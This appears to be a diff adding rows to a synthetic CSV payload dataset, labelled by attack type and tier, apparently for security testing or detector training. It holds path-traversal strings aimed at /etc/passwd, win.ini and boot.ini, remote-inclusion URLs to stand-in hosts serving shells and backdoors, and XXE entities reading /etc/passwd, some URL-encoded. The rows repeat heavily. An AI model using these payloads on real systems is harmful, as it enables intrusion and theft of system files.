+Local File Inclusion,Advanced,47,../../../../windows/win.ini
+Local File Inclusion,Advanced,48,../../../../../../../windows/win.ini
+Local File Inclusion,Advanced,49,../../../../../../../etc/passwd
+Local File Inclusion,Advanced,50,../etc/passwd
+Local File Inclusion,Advanced,51,../../../../windows/win.ini
+Local File Inclusion,Advanced,52,../../boot.ini
+Local File Inclusion,Advanced,53,../../boot.ini
+Local File Inclusion,Advanced,54,../etc/passwd
+Local File Inclusion,Advanced,55,../../../../../../../etc/passwd
+Local File Inclusion,Advanced,56,../../../../etc/passwd
+Local File Inclusion,Advanced,57,../../../../windows/win.ini
+Local File Inclusion,Advanced,58,../boot.ini
+Local File Inclusion,Advanced,59,../etc/passwd
+Local File Inclusion,Advanced,60,../boot.ini
+Local File Inclusion,Evasion,1,../etc/passwd
+Local File Inclusion,Evasion,2,../etc/passwd
+Local File Inclusion,Evasion,3,../etc/passwd
+Local File Inclusion,Evasion,4,../etc/passwd
+Local File Inclusion,Evasion,5,../../../../windows/win.ini
+Local File Inclusion,Evasion,6,../../../../../../../etc/passwd
+Local File Inclusion,Evasion,7,../../../../windows/win.ini
+Local File Inclusion,Evasion,8,../boot.ini
+Local File Inclusion,Evasion,9,../boot.ini
+Local File Inclusion,Evasion,10,../../../../../../../etc/passwd
+Local File Inclusion,Evasion,11,../../../../etc/passwd
+Local File Inclusion,Evasion,12,../../../../windows/win.ini
+Local File Inclusion,Evasion,13,../etc/passwd
+Local File Inclusion,Evasion,14,../../boot.ini
+Local File Inclusion,Evasion,15,../../boot.ini
+Local File Inclusion,Evasion,16,../etc/passwd
+Local File Inclusion,Evasion,17,../etc/passwd
+Local File Inclusion,Evasion,18,../boot.ini
+Local File Inclusion,Evasion,19,../boot.ini
+Local File Inclusion,Evasion,20,../../boot.ini
+Local File Inclusion,Evasion,21,../boot.ini
+Local File Inclusion,Evasion,22,../../../../etc/passwd
+Local File Inclusion,Evasion,23,../etc/passwd
+Local File Inclusion,Evasion,24,../../../../etc/passwd
+Local File Inclusion,Evasion,25,../../../../etc/passwd
+Local File Inclusion,Evasion,26,../../../../../../../etc/passwd
+Local File Inclusion,Evasion,27,../etc/passwd
+Local File Inclusion,Evasion,28,../../../../../../../windows/win.ini
+Local File Inclusion,Evasion,29,../../../../etc/passwd
+Local File Inclusion,Evasion,30,../../../../../../../windows/win.ini
+Local File Inclusion,Evasion,31,../../../../../../../etc/passwd
+Local File Inclusion,Evasion,32,../../../../etc/passwd
+Local File Inclusion,Evasion,33,../../../../../../../windows/win.ini
+Local File Inclusion,Evasion,34,../../../../etc/passwd
+Local File Inclusion,Evasion,35,../../../../windows/win.ini
+Local File Inclusion,Evasion,36,../../../../etc/passwd
+Local File Inclusion,Evasion,37,../../boot.ini
+Local File Inclusion,Evasion,38,../../../../etc/passwd
+Local File Inclusion,Evasion,39,../../../../etc/passwd
+Local File Inclusion,Evasion,40,../../../../../../../windows/win.ini
+Local File Inclusion,Evasion,41,../../../../windows/win.ini
+Local File Inclusion,Evasion,42,../../../../../../../etc/passwd
+Local File Inclusion,Evasion,43,../../../../windows/win.ini
+Local File Inclusion,Evasion,44,../boot.ini
+Local File Inclusion,Evasion,45,../../../../etc/passwd
+Local File Inclusion,Evasion,46,../etc/passwd
+Local File Inclusion,Evasion,47,../etc/passwd
+Local File Inclusion,Evasion,48,../../../../windows/win.ini
+Local File Inclusion,Evasion,49,../boot.ini
+Local File Inclusion,Evasion,50,../boot.ini
+Local File Inclusion,Evasion,51,../../../../windows/win.ini
+Local File Inclusion,Evasion,52,../etc/passwd
+Local File Inclusion,Evasion,53,../etc/passwd
+Local File Inclusion,Evasion,54,../../../../windows/win.ini
+Local File Inclusion,Evasion,55,../../../../etc/passwd
+Local File Inclusion,Evasion,56,../../../../etc/passwd
+Local File Inclusion,Evasion,57,../boot.ini
+Local File Inclusion,Evasion,58,../../../../etc/passwd
+Local File Inclusion,Evasion,59,../../../../../../../etc/passwd
+Local File Inclusion,Evasion,60,../../../../etc/passwd
+Remote File Inclusion,Basic,1,http://evil.com/shell.txt
+Remote File Inclusion,Basic,2,https://malicious.site/backdoor.txt
+Remote File Inclusion,Basic,3,https://malicious.site/backdoor.txt
+Remote File Inclusion,Basic,4,http://evil.com/shell.txt
+Remote File Inclusion,Basic,5,https://attacker.com/payload.php
+Remote File Inclusion,Basic,6,http://malicious.site/backdoor.txt
+Remote File Inclusion,Basic,7,http://evil.com/shell.txt
+Remote File Inclusion,Basic,8,http://evil.com/shell.txt
+Remote File Inclusion,Basic,9,http://malicious.site/backdoor.txt
+Remote File Inclusion,Basic,10,http://malicious.site/backdoor.txt
+Remote File Inclusion,Basic,11,http://malicious.site/backdoor.txt
+Remote File Inclusion,Basic,12,http://attacker.com/payload.php
+Remote File Inclusion,Basic,13,https://attacker.com/payload.php
+Remote File Inclusion,Basic,14,http://malicious.site/backdoor.txt
+Remote File Inclusion,Basic,15,http://evil.com/shell.txt
+Remote File Inclusion,Basic,16,http://attacker.com/payload.php
+Remote File Inclusion,Basic,17,http://attacker.com/payload.php
+Remote File Inclusion,Basic,18,http://attacker.com/payload.php
+Remote File Inclusion,Basic,19,http://evil.com/shell.txt
+Remote File Inclusion,Basic,20,https://malicious.site/backdoor.txt
+Remote File Inclusion,Basic,21,http://attacker.com/payload.php
+Remote File Inclusion,Basic,22,http://malicious.site/backdoor.txt
+Remote File Inclusion,Basic,23,http://attacker.com/payload.php
+Remote File Inclusion,Basic,24,https://evil.com/shell.txt
+Remote File Inclusion,Basic,25,http://evil.com/shell.txt
+Remote File Inclusion,Basic,26,https://evil.com/shell.txt
+Remote File Inclusion,Basic,27,http://attacker.com/payload.php
+Remote File Inclusion,Basic,28,https://evil.com/shell.txt
+Remote File Inclusion,Basic,29,https://evil.com/shell.txt
+Remote File Inclusion,Basic,30,https://evil.com/shell.txt
+Remote File Inclusion,Basic,31,http://malicious.site/backdoor.txt
+Remote File Inclusion,Basic,32,http://attacker.com/payload.php
+Remote File Inclusion,Basic,33,https://malicious.site/backdoor.txt
+Remote File Inclusion,Basic,34,http://malicious.site/backdoor.txt
+Remote File Inclusion,Basic,35,http://malicious.site/backdoor.txt
+Remote File Inclusion,Basic,36,http://attacker.com/payload.php
+Remote File Inclusion,Basic,37,http://attacker.com/payload.php
+Remote File Inclusion,Basic,38,https://attacker.com/payload.php
+Remote File Inclusion,Basic,39,http://malicious.site/backdoor.txt
+Remote File Inclusion,Basic,40,http://attacker.com/payload.php
+Remote File Inclusion,Basic,41,http://attacker.com/payload.php
+Remote File Inclusion,Basic,42,http://evil.com/shell.txt
+Remote File Inclusion,Basic,43,http://malicious.site/backdoor.txt
+Remote File Inclusion,Basic,44,http://attacker.com/payload.php
+Remote File Inclusion,Basic,45,http://evil.com/shell.txt
+Remote File Inclusion,Basic,46,http://attacker.com/payload.php
+Remote File Inclusion,Basic,47,http://malicious.site/backdoor.txt
+Remote File Inclusion,Basic,48,http://evil.com/shell.txt
+Remote File Inclusion,Basic,49,http://attacker.com/payload.php
+Remote File Inclusion,Basic,50,https://malicious.site/backdoor.txt
+Remote File Inclusion,Basic,51,http://attacker.com/payload.php
+Remote File Inclusion,Basic,52,https://malicious.site/backdoor.txt
+Remote File Inclusion,Basic,53,http://evil.com/shell.txt
+Remote File Inclusion,Basic,54,https://attacker.com/payload.php
+Remote File Inclusion,Basic,55,https://evil.com/shell.txt
+Remote File Inclusion,Basic,56,https://attacker.com/payload.php
+Remote File Inclusion,Basic,57,http://malicious.site/backdoor.txt
+Remote File Inclusion,Basic,58,http://malicious.site/backdoor.txt
+Remote File Inclusion,Basic,59,http://evil.com/shell.txt
+Remote File Inclusion,Basic,60,http://attacker.com/payload.php
+Remote File Inclusion,Advanced,1,http://evil.com/shell.txt
+Remote File Inclusion,Advanced,2,https://malicious.site/backdoor.txt
+Remote File Inclusion,Advanced,3,http://evil.com/shell.txt
+Remote File Inclusion,Advanced,4,http://malicious.site/backdoor.txt
+Remote File Inclusion,Advanced,5,http://attacker.com/payload.php
+Remote File Inclusion,Advanced,6,http://malicious.site/backdoor.txt
+Remote File Inclusion,Advanced,7,http://malicious.site/backdoor.txt
+Remote File Inclusion,Advanced,8,https://evil.com/shell.txt
+Remote File Inclusion,Advanced,9,http://malicious.site/backdoor.txt
+Remote File Inclusion,Advanced,10,http://malicious.site/backdoor.txt
+Remote File Inclusion,Advanced,11,https://malicious.site/backdoor.txt
+Remote File Inclusion,Advanced,12,http://attacker.com/payload.php
+Remote File Inclusion,Advanced,13,http://malicious.site/backdoor.txt
+Remote File Inclusion,Advanced,14,http://malicious.site/backdoor.txt
+Remote File Inclusion,Advanced,15,http://attacker.com/payload.php
+Remote File Inclusion,Advanced,16,https://attacker.com/payload.php
+Remote File Inclusion,Advanced,17,http://evil.com/shell.txt
+Remote File Inclusion,Advanced,18,https://malicious.site/backdoor.txt
+Remote File Inclusion,Advanced,19,http://malicious.site/backdoor.txt
+Remote File Inclusion,Advanced,20,https://evil.com/shell.txt
+Remote File Inclusion,Advanced,21,https://evil.com/shell.txt
+Remote File Inclusion,Advanced,22,http://evil.com/shell.txt
+Remote File Inclusion,Advanced,23,https://attacker.com/payload.php
+Remote File Inclusion,Advanced,24,http://evil.com/shell.txt
+Remote File Inclusion,Advanced,25,http://attacker.com/payload.php
+Remote File Inclusion,Advanced,26,http://evil.com/shell.txt
+Remote File Inclusion,Advanced,27,https://attacker.com/payload.php
+Remote File Inclusion,Advanced,28,http://evil.com/shell.txt
+Remote File Inclusion,Advanced,29,http://malicious.site/backdoor.txt
+Remote File Inclusion,Advanced,30,https://evil.com/shell.txt
+Remote File Inclusion,Advanced,31,http://attacker.com/payload.php
+Remote File Inclusion,Advanced,32,http://malicious.site/backdoor.txt
+Remote File Inclusion,Advanced,33,http://attacker.com/payload.php
+Remote File Inclusion,Advanced,34,http://attacker.com/payload.php
+Remote File Inclusion,Advanced,35,https://attacker.com/payload.php
+Remote File Inclusion,Advanced,36,http://attacker.com/payload.php
+Remote File Inclusion,Advanced,37,http://attacker.com/payload.php
+Remote File Inclusion,Advanced,38,http://malicious.site/backdoor.txt
+Remote File Inclusion,Advanced,39,https://malicious.site/backdoor.txt
+Remote File Inclusion,Advanced,40,https://malicious.site/backdoor.txt
+Remote File Inclusion,Advanced,41,https://malicious.site/backdoor.txt
+Remote File Inclusion,Advanced,42,http://evil.com/shell.txt
+Remote File Inclusion,Advanced,43,https://malicious.site/backdoor.txt
+Remote File Inclusion,Advanced,44,http://attacker.com/payload.php
+Remote File Inclusion,Advanced,45,http://evil.com/shell.txt
+Remote File Inclusion,Advanced,46,http://attacker.com/payload.php
+Remote File Inclusion,Advanced,47,http://attacker.com/payload.php
+Remote File Inclusion,Advanced,48,http://evil.com/shell.txt
+Remote File Inclusion,Advanced,49,http://malicious.site/backdoor.txt
+Remote File Inclusion,Advanced,50,http://attacker.com/payload.php
+Remote File Inclusion,Advanced,51,http://evil.com/shell.txt
+Remote File Inclusion,Advanced,52,http://evil.com/shell.txt
+Remote File Inclusion,Advanced,53,http://evil.com/shell.txt
+Remote File Inclusion,Advanced,54,http://evil.com/shell.txt
+Remote File Inclusion,Advanced,55,http://attacker.com/payload.php
+Remote File Inclusion,Advanced,56,http://attacker.com/payload.php
+Remote File Inclusion,Advanced,57,https://evil.com/shell.txt
+Remote File Inclusion,Advanced,58,http://malicious.site/backdoor.txt
+Remote File Inclusion,Advanced,59,http://evil.com/shell.txt
+Remote File Inclusion,Advanced,60,http://evil.com/shell.txt
+Remote File Inclusion,Evasion,1,http://malicious.site/backdoor.txt
+Remote File Inclusion,Evasion,2,https://malicious.site/backdoor.txt
+Remote File Inclusion,Evasion,3,https://attacker.com/payload.php
+Remote File Inclusion,Evasion,4,https://malicious.site/backdoor.txt
+Remote File Inclusion,Evasion,5,http://attacker.com/payload.php
+Remote File Inclusion,Evasion,6,http://evil.com/shell.txt
+Remote File Inclusion,Evasion,7,http://attacker.com/payload.php
+Remote File Inclusion,Evasion,8,http://evil.com/shell.txt
+Remote File Inclusion,Evasion,9,http://attacker.com/payload.php
+Remote File Inclusion,Evasion,10,http://evil.com/shell.txt
+Remote File Inclusion,Evasion,11,http://attacker.com/payload.php
+Remote File Inclusion,Evasion,12,http://evil.com/shell.txt
+Remote File Inclusion,Evasion,13,http://malicious.site/backdoor.txt
+Remote File Inclusion,Evasion,14,http://malicious.site/backdoor.txt
+Remote File Inclusion,Evasion,15,http://malicious.site/backdoor.txt
+Remote File Inclusion,Evasion,16,http://malicious.site/backdoor.txt
+Remote File Inclusion,Evasion,17,http://evil.com/shell.txt
+Remote File Inclusion,Evasion,18,http://evil.com/shell.txt
+Remote File Inclusion,Evasion,19,http://evil.com/shell.txt
+Remote File Inclusion,Evasion,20,http://evil.com/shell.txt
+Remote File Inclusion,Evasion,21,https://evil.com/shell.txt
+Remote File Inclusion,Evasion,22,http://malicious.site/backdoor.txt
+Remote File Inclusion,Evasion,23,https://malicious.site/backdoor.txt
+Remote File Inclusion,Evasion,24,http://malicious.site/backdoor.txt
+Remote File Inclusion,Evasion,25,http://malicious.site/backdoor.txt
+Remote File Inclusion,Evasion,26,http://attacker.com/payload.php
+Remote File Inclusion,Evasion,27,http://evil.com/shell.txt
+Remote File Inclusion,Evasion,28,http://evil.com/shell.txt
+Remote File Inclusion,Evasion,29,http://malicious.site/backdoor.txt
+Remote File Inclusion,Evasion,30,http://attacker.com/payload.php
+Remote File Inclusion,Evasion,31,http://malicious.site/backdoor.txt
+Remote File Inclusion,Evasion,32,http://evil.com/shell.txt
+Remote File Inclusion,Evasion,33,http://attacker.com/payload.php
+Remote File Inclusion,Evasion,34,http://evil.com/shell.txt
+Remote File Inclusion,Evasion,35,https://attacker.com/payload.php
+Remote File Inclusion,Evasion,36,http://attacker.com/payload.php
+Remote File Inclusion,Evasion,37,http://evil.com/shell.txt
+Remote File Inclusion,Evasion,38,http://attacker.com/payload.php
+Remote File Inclusion,Evasion,39,http://evil.com/shell.txt
+Remote File Inclusion,Evasion,40,http://attacker.com/payload.php
+Remote File Inclusion,Evasion,41,https://malicious.site/backdoor.txt
+Remote File Inclusion,Evasion,42,http://evil.com/shell.txt
+Remote File Inclusion,Evasion,43,http://evil.com/shell.txt
+Remote File Inclusion,Evasion,44,http://evil.com/shell.txt
+Remote File Inclusion,Evasion,45,http://malicious.site/backdoor.txt
+Remote File Inclusion,Evasion,46,http://attacker.com/payload.php
+Remote File Inclusion,Evasion,47,http://malicious.site/backdoor.txt
+Remote File Inclusion,Evasion,48,http://evil.com/shell.txt
+Remote File Inclusion,Evasion,49,https://malicious.site/backdoor.txt
+Remote File Inclusion,Evasion,50,http://malicious.site/backdoor.txt
+Remote File Inclusion,Evasion,51,https://evil.com/shell.txt
+Remote File Inclusion,Evasion,52,http://attacker.com/payload.php
+Remote File Inclusion,Evasion,53,http://evil.com/shell.txt
+Remote File Inclusion,Evasion,54,http://evil.com/shell.txt
+Remote File Inclusion,Evasion,55,http://evil.com/shell.txt
+Remote File Inclusion,Evasion,56,https://attacker.com/payload.php
+Remote File Inclusion,Evasion,57,http://evil.com/shell.txt
+Remote File Inclusion,Evasion,58,http://malicious.site/backdoor.txt
+Remote File Inclusion,Evasion,59,http://evil.com/shell.txt
+Remote File Inclusion,Evasion,60,https://evil.com/shell.txt
+XXE,Basic,1,"<!DOCTYPE data [<!ENTITY file SYSTEM ""file:///etc/passwd"">]>"
+XXE,Basic,2,"<!DOCTYPE data [<!ENTITY file SYSTEM ""file:///etc/passwd"">]>"
+XXE,Basic,3,"<!DOCTYPE data [<!ENTITY file SYSTEM ""file:///etc/passwd"">]>"
+XXE,Basic,4,"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">"
+XXE,Basic,5,"<!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]>"
+XXE,Basic,6,"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">"
+XXE,Basic,7,"<!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]>"
+XXE,Basic,8,"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">"
+XXE,Basic,9,"<!DOCTYPE data [<!ENTITY file SYSTEM ""file:///etc/passwd"">]>"
+XXE,Basic,10,"<!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]>"
+XXE,Basic,11,"<!DOCTYPE data [<!ENTITY file SYSTEM ""file:///etc/passwd"">]>"
+XXE,Basic,12,"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">"
+XXE,Basic,13,"<!entity xxe SYSTEM ""file:///etc/passwd"">"
+XXE,Basic,14,"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">"
+XXE,Basic,15,"<!doctype foo [ <!entity xxe SYSTEM ""file:///etc/passwd""> ]>"
+XXE,Basic,16,"<!doctype foo [ <!entity xxe SYSTEM ""file:///etc/passwd""> ]>"
+XXE,Basic,17,"<!DOCTYPE data [<!ENTITY file SYSTEM ""file:///etc/passwd"">]>"
+XXE,Basic,18,"<!entity xxe SYSTEM ""file:///etc/passwd"">"
+XXE,Basic,19,"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">"
+XXE,Basic,20,"<!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]>"
+XXE,Basic,21,"<!entity xxe SYSTEM ""file:///etc/passwd"">"
+XXE,Basic,22,"<!doctype data [<!entity file SYSTEM ""file:///etc/passwd"">]>"
+XXE,Basic,23,"<!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]>"
+XXE,Basic,24,"<!entity xxe SYSTEM ""file:///etc/passwd"">"
+XXE,Basic,25,"<!DOCTYPE data [<!ENTITY file SYSTEM ""file:///etc/passwd"">]>"
+XXE,Basic,26,"<!doctype foo [ <!entity xxe SYSTEM ""file:///etc/passwd""> ]>"
+XXE,Basic,27,"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">"
+XXE,Basic,28,"<!doctype data [<!entity file SYSTEM ""file:///etc/passwd"">]>"
+XXE,Basic,29,"<!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]>"
+XXE,Basic,30,"<!entity xxe SYSTEM ""file:///etc/passwd"">"
+XXE,Basic,31,"<!doctype foo [ <!entity xxe SYSTEM ""file:///etc/passwd""> ]>"
+XXE,Basic,32,"<!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]>"
+XXE,Basic,33,"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">"
+XXE,Basic,34,"<!DOCTYPE data [<!ENTITY file SYSTEM ""file:///etc/passwd"">]>"
+XXE,Basic,35,"<!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]>"
+XXE,Basic,36,"<!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]>"
+XXE,Basic,37,"<!DOCTYPE data [<!ENTITY file SYSTEM ""file:///etc/passwd"">]>"
+XXE,Basic,38,"<!DOCTYPE data [<!ENTITY file SYSTEM ""file:///etc/passwd"">]>"
+XXE,Basic,39,"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">"
+XXE,Basic,40,"<!DOCTYPE data [<!ENTITY file SYSTEM ""file:///etc/passwd"">]>"
+XXE,Basic,41,"<!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]>"
+XXE,Basic,42,"<!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]>"
+XXE,Basic,43,"<!DOCTYPE data [<!ENTITY file SYSTEM ""file:///etc/passwd"">]>"
+XXE,Basic,44,"<!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]>"
+XXE,Basic,45,"<!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]>"
+XXE,Basic,46,"<!entity xxe SYSTEM ""file:///etc/passwd"">"
+XXE,Basic,47,"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">"
+XXE,Basic,48,"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">"
+XXE,Basic,49,"<!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]>"
+XXE,Basic,50,"<!entity xxe SYSTEM ""file:///etc/passwd"">"
+XXE,Basic,51,"<!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]>"
+XXE,Basic,52,"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">"
+XXE,Basic,53,"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">"
+XXE,Basic,54,"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">"
+XXE,Basic,55,"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">"
+XXE,Basic,56,"<!DOCTYPE data [<!ENTITY file SYSTEM ""file:///etc/passwd"">]>"
+XXE,Basic,57,"<!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]>"
+XXE,Basic,58,"<!doctype foo [ <!entity xxe SYSTEM ""file:///etc/passwd""> ]>"
+XXE,Basic,59,"<!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]>"
+XXE,Basic,60,"<!DOCTYPE data [<!ENTITY file SYSTEM ""file:///etc/passwd"">]>"
+XXE,Advanced,1,"<!DOCTYPE data [<!ENTITY file SYSTEM ""file:///etc/passwd"">]>"
+XXE,Advanced,2,"<!DOCTYPE data [<!ENTITY file SYSTEM ""file:///etc/passwd"">]>"
+XXE,Advanced,3,"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">"
+XXE,Advanced,4,"<!DOCTYPE data [<!ENTITY file SYSTEM ""file:///etc/passwd"">]>"
+XXE,Advanced,5,"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">"
+XXE,Advanced,6,"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">"
+XXE,Advanced,7,"<!DOCTYPE data [<!ENTITY file SYSTEM ""file:///etc/passwd"">]>"
+XXE,Advanced,8,"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">"
+XXE,Advanced,9,"<!DOCTYPE data [<!ENTITY file SYSTEM ""file:///etc/passwd"">]>"
+XXE,Advanced,10,"<!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]>"
+XXE,Advanced,11,"<!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]>"
+XXE,Advanced,12,"<!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]>"
+XXE,Advanced,13,"<!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]>"
+XXE,Advanced,14,"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">"
+XXE,Advanced,15,"<!DOCTYPE data [<!ENTITY file SYSTEM ""file:///etc/passwd"">]>"
+XXE,Advanced,16,"<!entity xxe SYSTEM ""file:///etc/passwd"">"
+XXE,Advanced,17,"<!DOCTYPE data [<!ENTITY file SYSTEM ""file:///etc/passwd"">]>"
+XXE,Advanced,18,"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">"
+XXE,Advanced,19,"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">"
+XXE,Advanced,20,"<!doctype data [<!entity file SYSTEM ""file:///etc/passwd"">]>"
+XXE,Advanced,21,"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">"
+XXE,Advanced,22,"<!doctype foo [ <!entity xxe SYSTEM ""file:///etc/passwd""> ]>"
+XXE,Advanced,23,"<!DOCTYPE data [<!ENTITY file SYSTEM ""file:///etc/passwd"">]>"
+XXE,Advanced,24,"<!entity xxe SYSTEM ""file:///etc/passwd"">"
+XXE,Advanced,25,"<!DOCTYPE data [<!ENTITY file SYSTEM ""file:///etc/passwd"">]>"
+XXE,Advanced,26,"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">"
+XXE,Advanced,27,"<!doctype data [<!entity file SYSTEM ""file:///etc/passwd"">]>"
+XXE,Advanced,28,"<!doctype foo [ <!entity xxe SYSTEM ""file:///etc/passwd""> ]>"
+XXE,Advanced,29,"<!entity xxe SYSTEM ""file:///etc/passwd"">"
+XXE,Advanced,30,"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">"
+XXE,Advanced,31,"<!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]>"
+XXE,Advanced,32,"<!doctype foo [ <!entity xxe SYSTEM ""file:///etc/passwd""> ]>"
+XXE,Advanced,33,"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">"
+XXE,Advanced,34,"<!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]>"
+XXE,Advanced,35,"<!entity xxe SYSTEM ""file:///etc/passwd"">"
+XXE,Advanced,36,"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">"
+XXE,Advanced,37,"<!entity xxe SYSTEM ""file:///etc/passwd"">"
+XXE,Advanced,38,"<!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]>"
+XXE,Advanced,39,"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">"
+XXE,Advanced,40,"<!DOCTYPE data [<!ENTITY file SYSTEM ""file:///etc/passwd"">]>"
+XXE,Advanced,41,"<!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]>"
+XXE,Advanced,42,"<!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]>"
+XXE,Advanced,43,"<!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]>"
+XXE,Advanced,44,"<!entity xxe SYSTEM ""file:///etc/passwd"">"
+XXE,Advanced,45,"<!doctype foo [ <!entity xxe SYSTEM ""file:///etc/passwd""> ]>"
+XXE,Advanced,46,"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">"
+XXE,Advanced,47,"<!doctype foo [ <!entity xxe SYSTEM ""file:///etc/passwd""> ]>"
+XXE,Advanced,48,"<!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]>"
+XXE,Advanced,49,"<!entity xxe SYSTEM ""file:///etc/passwd"">"
+XXE,Advanced,50,"<!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]>"
+XXE,Advanced,51,"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">"
+XXE,Advanced,52,"<!entity xxe SYSTEM ""file:///etc/passwd"">"
+XXE,Advanced,53,"<!doctype data [<!entity file SYSTEM ""file:///etc/passwd"">]>"
+XXE,Advanced,54,"<!DOCTYPE data [<!ENTITY file SYSTEM ""file:///etc/passwd"">]>"
+XXE,Advanced,55,"<!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]>"
+XXE,Advanced,56,"<!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]>"
+XXE,Advanced,57,"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">"
+XXE,Advanced,58,"<!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]>"
+XXE,Advanced,59,"<!doctype data [<!entity file SYSTEM ""file:///etc/passwd"">]>"
+XXE,Advanced,60,"<!DOCTYPE data [<!ENTITY file SYSTEM ""file:///etc/passwd"">]>"
+XXE,Evasion,1,%3C!DOCTYPE%20data%20[%3C!ENTITY%20file%20SYSTEM%20%22file:///etc/passwd%22%3E]%3E
+XXE,Evasion,2,%3C!DOCTYPE%20data%20[%3C!ENTITY%20file%20SYSTEM%20%22file:///etc/passwd%22%3E]%3E
+XXE,Evasion,3,%3C!doctype%20foo%20[%20%3C!entity%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E%20]%3E
+XXE,Evasion,4,%3C!ENTITY%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E
+XXE,Evasion,5,%3C!doctype%20data%20[%3C!entity%20file%20SYSTEM%20%22file:///etc/passwd%22%3E]%3E
+XXE,Evasion,6,%3C!DOCTYPE%20foo%20[%20%3C!ENTITY%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E%20]%3E
+XXE,Evasion,7,%3C!ENTITY%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E
+XXE,Evasion,8,%3C!DOCTYPE%20foo%20[%20%3C!ENTITY%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E%20]%3E
+XXE,Evasion,9,%3C!DOCTYPE%20data%20[%3C!ENTITY%20file%20SYSTEM%20%22file:///etc/passwd%22%3E]%3E
+XXE,Evasion,10,%3C!DOCTYPE%20foo%20[%20%3C!ENTITY%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E%20]%3E
+XXE,Evasion,11,%3C!doctype%20foo%20[%20%3C!entity%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E%20]%3E
+XXE,Evasion,12,%3C!ENTITY%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E
+XXE,Evasion,13,%3C!ENTITY%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E
+XXE,Evasion,14,%3C!DOCTYPE%20foo%20[%20%3C!ENTITY%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E%20]%3E
+XXE,Evasion,15,%3C!DOCTYPE%20foo%20[%20%3C!ENTITY%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E%20]%3E
+XXE,Evasion,16,%3C!entity%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E
+XXE,Evasion,17,%3C!ENTITY%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E
